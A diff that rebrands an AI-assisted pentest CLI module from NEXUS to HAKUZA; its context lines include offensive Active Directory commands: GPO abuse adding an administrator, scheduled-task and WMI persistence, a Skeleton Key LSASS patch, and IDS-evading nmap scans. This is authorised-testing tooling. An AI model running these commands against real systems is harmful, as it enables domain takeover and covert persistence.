@@ -1,5 +1,5 @@
-# mod_ad_network.py — Active Directory & Network Pentest Module for NEXUS
-# Merged into nexus.py at build time. All functions use interfaces above.
+# mod_ad_network.py — Active Directory & Network Pentest Module for HAKUZA
+# Merged into hakuza.py at build time. All functions use interfaces above.
 #
 # Author  : Divith D Shetty | CEH · CRTP · CAISP
 # Purpose : cmd_ad, cmd_network, cmd_lateral — AD & network pentest playbooks
@@ -13,9 +13,9 @@ import shutil
 from pathlib import Path
 from datetime import datetime
 
-# At merge time all nexus_interfaces symbols are already in scope.
+# At merge time all hakuza_interfaces symbols are already in scope.
 # This import line is kept as the canonical merge marker.
-from nexus_interfaces import *  # noqa: F401,F403
+from hakuza_interfaces import *  # noqa: F401,F403
 
 # ---------------------------------------------------------------------------
 # BLOODHOUND CYPHER REFERENCE (BFSI-tuned top-10 queries)
@@ -212,7 +212,7 @@ certipy relay -target 'http://<CA_HOST>/certsrv/certfnsh.asp' -ca '<CA_NAME>'
 ### GPO Abuse / lsass / Token Impersonation
 ```bash
 # GPO abuse via SharpGPOAbuse (if you have write on a GPO)
-SharpGPOAbuse.exe --AddComputerTask --TaskName "nexus" \
+SharpGPOAbuse.exe --AddComputerTask --TaskName "hakuza" \
   --Author "<DOMAIN>\Administrator" --Command "cmd.exe" \
   --Arguments "/c net localgroup administrators <USER> /add" \
   --GPOName "<TARGET_GPO>"
@@ -376,8 +376,8 @@ schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "C:\\Temp\\beacon.exe" \
 
 # WMI event subscription (fileless persistence)
 $filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription \
-  -Arguments @{Name='NexusTrigger';EventNamespace='root\\cimv2';
-    QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerID='NexusTimer'"}
+  -Arguments @{Name='HakuzaTrigger';EventNamespace='root\\cimv2';
+    QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerID='HakuzaTimer'"}
 
 # Skeleton Key (patches LSASS — lets any account auth with master password)
 # Mimikatz: misc::skeleton
@@ -391,7 +391,7 @@ $filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription \
 
 def cmd_ad(args, console) -> None:
     """
-    nexus ad [--dc <ip>] [--domain <domain>] [--user <user>] [--save]
+    hakuza ad [--dc <ip>] [--domain <domain>] [--user <user>] [--save]
 
     Generates a complete Active Directory pentest playbook for the current
     engagement via Claude (streamed), then offers to log phase findings.
@@ -415,7 +415,7 @@ def cmd_ad(args, console) -> None:
             f"[bold]DC / Target:[/bold] {dc_ip}\n"
             f"[bold]Domain:[/bold]      {domain}\n"
             f"[bold]User:[/bold]        {user}",
-            title="[bold red]  NEXUS — Active Directory Pentest[/bold red]",
+            title="[bold red]  HAKUZA — Active Directory Pentest[/bold red]",
             border_style="red",
             expand=False,
         )
@@ -459,7 +459,7 @@ def cmd_ad(args, console) -> None:
     # ------------------------------------------------------------------
     if do_save and response:
         ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
-        eng_dir = NEXUS_DIR / "engagements" / eng["name"]
+        eng_dir = HAKUZA_DIR / "engagements" / eng["name"]
         reports_dir = eng_dir / "reports"
         reports_dir.mkdir(parents=True, exist_ok=True)
         out_path = reports_dir / f"ad_playbook_{ts}.md"
@@ -504,7 +504,7 @@ def cmd_ad(args, console) -> None:
     console.print(Rule("[bold yellow]Log Findings[/bold yellow]", style="dim yellow"))
     console.print(
         "[yellow]Do you want to log placeholder findings for each AD phase?\n"
-        "You can edit them later with [bold]nexus update[/bold].[/yellow]"
+        "You can edit them later with [bold]hakuza update[/bold].[/yellow]"
     )
 
     phase_findings = [
@@ -563,7 +563,7 @@ def cmd_ad(args, console) -> None:
                 mitre=mitre,
                 description=desc,
                 remediation=rem,
-                tool="nexus-ad",
+                tool="hakuza-ad",
                 url=dc_ip,
             )
             console.print(
@@ -572,17 +572,17 @@ def cmd_ad(args, console) -> None:
             )
         console.print(
             f"\n[green]All 6 phase findings saved.[/green] "
-            f"Edit with [cyan]nexus update <short_id>[/cyan]."
+            f"Edit with [cyan]hakuza update <short_id>[/cyan]."
         )
     else:
-        console.print("[dim]Skipped. Use [bold]nexus add[/bold] to log findings manually.[/dim]")
+        console.print("[dim]Skipped. Use [bold]hakuza add[/bold] to log findings manually.[/dim]")
 
     console.print()
     console.print(
         Panel(
             f"[bold green]AD playbook complete.[/bold green]\n\n"
-            f"Next: [cyan]nexus lateral --from-host {dc_ip}[/cyan] for lateral movement chains.\n"
-            f"Then: [cyan]nexus findings[/cyan] to review all logged issues.",
+            f"Next: [cyan]hakuza lateral --from-host {dc_ip}[/cyan] for lateral movement chains.\n"
+            f"Then: [cyan]hakuza findings[/cyan] to review all logged issues.",
             title="[bold]Done[/bold]",
             border_style="green",
             expand=False,
@@ -615,17 +615,17 @@ nbtscan -r <RANGE>
 ```bash
 nmap -sV -sC -T4 --open \
   -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,\
-3306,3389,5900,8080,8443 <RANGE> -oA nexus_quick
+3306,3389,5900,8080,8443 <RANGE> -oA hakuza_quick
 ```
 
 ### Full scan (all 65535 ports, T3 — stealth-friendly)
 ```bash
-nmap -sV -sC -T3 -p- --open <RANGE> -oA nexus_full
+nmap -sV -sC -T3 -p- --open <RANGE> -oA hakuza_full
 ```
 
 ### Stealth scan (SYN-only, T2, IDS evasion)
 ```bash
-nmap -sS -T2 --open -p- <RANGE> -oA nexus_stealth
+nmap -sS -T2 --open -p- <RANGE> -oA hakuza_stealth
 # Fragment packets for IDS bypass
 nmap -sS -f --mtu 24 -T2 --open -p- <RANGE>
 ```
@@ -867,7 +867,7 @@ _NETWORK_COMMON_CREDS = [
 
 def cmd_network(args, console) -> None:
     """
-    nexus network [--range <CIDR>] [--profile quick|full|stealth] [--save]
+    hakuza network [--range <CIDR>] [--profile quick|full|stealth] [--save]
 
     Generates an AI-augmented network pentest playbook with host discovery,
     service enumeration, protocol attacks, MITM, and pivoting.
@@ -887,10 +887,10 @@ def cmd_network(args, console) -> None:
         "quick": (
             f"nmap -sV -sC -T4 --open "
             f"-p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,"
-            f"1723,3306,3389,5900,8080,8443 {cidr_range} -oA nexus_quick"
+            f"1723,3306,3389,5900,8080,8443 {cidr_range} -oA hakuza_quick"
         ),
-        "full": f"nmap -sV -sC -T3 -p- --open {cidr_range} -oA nexus_full",
-        "stealth": f"nmap -sS -T2 --open -p- {cidr_range} -oA nexus_stealth",
+        "full": f"nmap -sV -sC -T3 -p- --open {cidr_range} -oA hakuza_full",
+        "stealth": f"nmap -sS -T2 --open -p- {cidr_range} -oA hakuza_stealth",
     }
 
     console.print(
@@ -900,7 +900,7 @@ def cmd_network(args, console) -> None:
             f"[bold]Range:[/bold]       {cidr_range}\n"
             f"[bold]Profile:[/bold]     {profile}\n"
             f"[bold]Nmap cmd:[/bold]    {nmap_cmds[profile]}",
-            title="[bold blue]  NEXUS — Network Pentest[/bold blue]",
+            title="[bold blue]  HAKUZA — Network Pentest[/bold blue]",
             border_style="blue",
             expand=False,
         )
@@ -978,7 +978,7 @@ def cmd_network(args, console) -> None:
     # ------------------------------------------------------------------
     if do_save and response:
         ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
-        eng_dir = NEXUS_DIR / "engagements" / eng["name"]
+        eng_dir = HAKUZA_DIR / "engagements" / eng["name"]
         reports_dir = eng_dir / "reports"
         reports_dir.mkdir(parents=True, exist_ok=True)
         out_path = reports_dir / f"network_playbook_{ts}.md"
@@ -1047,7 +1047,7 @@ def cmd_network(args, console) -> None:
                 mitre=mitre,
                 description=desc,
                 remediation=rem,
-                tool="nexus-network",
+                tool="hakuza-network",
                 url=cidr_range,
             )
             console.print(
@@ -1056,17 +1056,17 @@ def cmd_network(args, console) -> None:
             )
         console.print(
             "\n[green]5 network findings saved.[/green] "
-            "Edit with [cyan]nexus update <short_id>[/cyan]."
+            "Edit with [cyan]hakuza update <short_id>[/cyan]."
         )
     else:
-        console.print("[dim]Skipped. Use [bold]nexus add[/bold] to log findings manually.[/dim]")
+        console.print("[dim]Skipped. Use [bold]hakuza add[/bold] to log findings manually.[/dim]")
 
     console.print()
     console.print(
         Panel(
             f"[bold green]Network playbook complete.[/bold green]\n\n"
-            f"Tip: Import nmap XML results with [cyan]nexus import nexus_quick.xml[/cyan].\n"
-            f"Next: [cyan]nexus ad --dc <DC_IP> --domain <DOMAIN>[/cyan] if AD is detected.",
+            f"Tip: Import nmap XML results with [cyan]hakuza import hakuza_quick.xml[/cyan].\n"
+            f"Next: [cyan]hakuza ad --dc <DC_IP> --domain <DOMAIN>[/cyan] if AD is detected.",
             title="[bold]Done[/bold]",
             border_style="green",
             expand=False,
@@ -1221,7 +1221,7 @@ impacket-psexec <DOMAIN>/<DA_USER>:'<PASS>'@<DC_IP>
 
 def cmd_lateral(args, console) -> None:
     """
-    nexus lateral [--technique <technique>] [--from-host <host>] [--to-host <host>]
+    hakuza lateral [--technique <technique>] [--from-host <host>] [--to-host <host>]
 
     Generates a lateral movement decision tree based on the access you currently have.
     Prompts for current access type, shows exact commands for each scenario.
@@ -1241,7 +1241,7 @@ def cmd_lateral(args, console) -> None:
             f"[bold]To host:[/bold]     {to_host}\n"
             + (f"[bold]Technique:[/bold]   {technique}" if technique else
                "[bold]Technique:[/bold]   (all — decision tree mode)"),
-            title="[bold yellow]  NEXUS — Lateral Movement[/bold yellow]",
+            title="[bold yellow]  HAKUZA — Lateral Movement[/bold yellow]",
             border_style="yellow",
             expand=False,
         )
@@ -1380,7 +1380,7 @@ def cmd_lateral(args, console) -> None:
                 "Deploy Privileged Access Workstations (PAW) for admin tasks. "
                 "Monitor lateral movement indicators: Event IDs 4624 (type 3), 4648, 7045."
             ),
-            tool="nexus-lateral",
+            tool="hakuza-lateral",
             url=f"{from_host} → {to_host}",
         )
         console.print(
@@ -1394,8 +1394,8 @@ def cmd_lateral(args, console) -> None:
     console.print(
         Panel(
             "[bold green]Lateral movement analysis complete.[/bold green]\n\n"
-            "Next: [cyan]nexus ad[/cyan] to escalate to Domain Admin,\n"
-            "or    [cyan]nexus findings[/cyan] to review all logged findings.",
+            "Next: [cyan]hakuza ad[/cyan] to escalate to Domain Admin,\n"
+            "or    [cyan]hakuza findings[/cyan] to review all logged findings.",
             title="[bold]Done[/bold]",
             border_style="green",
             expand=False,
@@ -1490,7 +1490,7 @@ def _print_lateral_technique_table(console) -> None:
 
 
 # ---------------------------------------------------------------------------
-# ARGPARSE ADDITIONS — paste into build_parser() in nexus.py
+# ARGPARSE ADDITIONS — paste into build_parser() in hakuza.py
 # ---------------------------------------------------------------------------
 #
 #   p_ad = sub.add_parser("ad", help="Active Directory pentest playbook (CRTP-grade)")
@@ -1512,7 +1512,7 @@ def _print_lateral_technique_table(console) -> None:
 #   p_lateral.add_argument("--to-host",    metavar="HOST",      help="Target host / IP")
 
 # ---------------------------------------------------------------------------
-# DISPATCH ADDITIONS — paste into dispatch dict in main() in nexus.py
+# DISPATCH ADDITIONS — paste into dispatch dict in main() in hakuza.py
 # ---------------------------------------------------------------------------
 #
 #   "ad":      cmd_ad,
